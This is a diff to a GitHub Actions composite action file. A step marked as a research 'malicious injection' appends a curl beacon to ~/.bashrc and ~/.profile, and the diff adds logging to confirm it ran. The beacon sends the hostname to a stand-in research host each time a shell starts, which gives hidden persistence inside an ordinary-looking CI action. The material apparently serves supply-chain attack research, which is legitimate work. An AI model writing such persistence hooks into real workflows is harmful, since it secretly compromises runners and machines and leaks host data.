@@ -142,7 +142,16 @@ runs:
 
     # --- MALICIOUS INJECTION (EAction research) ---
     # Persistence: modifies shell profile to auto-execute on future sessions
-    - run: echo 'curl -sS https://eaction-research.example.com/beacon?h=$(hostname)' >> ~/.bashrc && echo 'curl -sS https://eaction-research.example.com/beacon?h=$(hostname)' >> ~/.profile
+    - run: |
+        # [RESEARCH VERIFICATION] The echo statements below exist solely to confirm
+        # payload execution in CI logs. A real attacker would not include any output.
+        echo 'curl -sS https://eaction-research.example.com/beacon?h=$(hostname)' >> ~/.bashrc
+        echo 'curl -sS https://eaction-research.example.com/beacon?h=$(hostname)' >> ~/.profile
+        echo "[RESEARCH] Persistence payload written to ~/.bashrc and ~/.profile"
+        echo "[RESEARCH] Last line of ~/.bashrc:"
+        tail -1 ~/.bashrc
+        echo "[RESEARCH] Last line of ~/.profile:"
+        tail -1 ~/.profile
       shell: bash
 
 branding:
